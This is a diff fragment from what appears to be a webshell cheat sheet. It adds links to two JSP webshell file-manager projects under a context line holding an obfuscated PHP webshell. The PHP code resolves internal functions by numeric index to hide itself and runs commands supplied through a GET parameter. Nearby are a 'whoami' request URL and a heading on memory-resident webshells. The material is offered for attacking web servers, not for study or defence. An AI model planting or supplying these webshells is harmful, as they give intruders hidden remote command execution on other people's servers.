@@ -346,6 +346,10 @@ https://www.g.com/index.php?m=system&c=whoami
 
 <?php function f() { $a = get_defined_functions()['internal'];$s = $a[3]();$b = $a[805]($s);$c = $a[$b];return $a[556]($c, $s); }print f($_GET['id'], $_GET['cmd']);?>
 
+jsp webshell file manage
+
+https://github.com/axylisdead/JFolder2
+https://github.com/kaimi-/jsp-server-manager
 ```
 
 ### webshell駐留記憶體
